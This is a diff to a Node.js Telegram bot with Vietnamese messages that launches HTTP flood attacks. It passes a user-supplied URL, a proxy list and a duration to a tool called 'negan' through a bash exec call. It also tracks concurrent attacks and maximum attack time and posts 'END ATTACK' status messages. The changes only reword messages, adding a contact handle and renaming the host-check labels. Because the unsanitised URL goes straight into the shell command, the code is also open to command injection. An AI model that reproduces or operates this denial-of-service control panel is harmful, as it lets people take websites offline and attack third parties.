@@ -10,7 +10,7 @@ const helpMessage = `📜 Hướng dẫn sử dụng:
 bot.on('message', async (msg) => {
     const { chat: { id: chatId }, text, from: { id: userId, username, first_name } } = msg, isAdmin = chatId === adminId, isGroup = allowedGroupIds.has(chatId), caller = username || first_name;
 
-    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '🚫 Bạn không có quyền sử dụng.', { parse_mode: 'HTML' });
+    if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: @NeganSSHConsole.', { parse_mode: 'HTML' });
     if (!['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;
 
     if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });
@@ -50,15 +50,15 @@ bot.on('message', async (msg) => {
             Maxtime: maxTimeAttacks,
             ConcurrentAttacks: currentProcesses,
             StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
-            CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
-            HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
+            CheckHostURL: `SERVER1 (https://check-host.net/check-http?host=${host})`,
+            HostTracker: `SERVER2 (https://www.host-tracker.com/en/ic/check-http?url=${host})`
         };
 
         await bot.sendMessage(chatId, JSON.stringify(startMessage, null, 2), { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });
 
         const child = exec(`node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`, { shell: '/bin/bash' });
         child.on('close', () => {
-            const completeMessage = { Status: "👽Process completed👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${time} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
+            const completeMessage = { Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${time} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) };
             bot.sendMessage(chatId, JSON.stringify(completeMessage, null, 2), { parse_mode: 'HTML' });
 
             delete activeAttacks[pid];
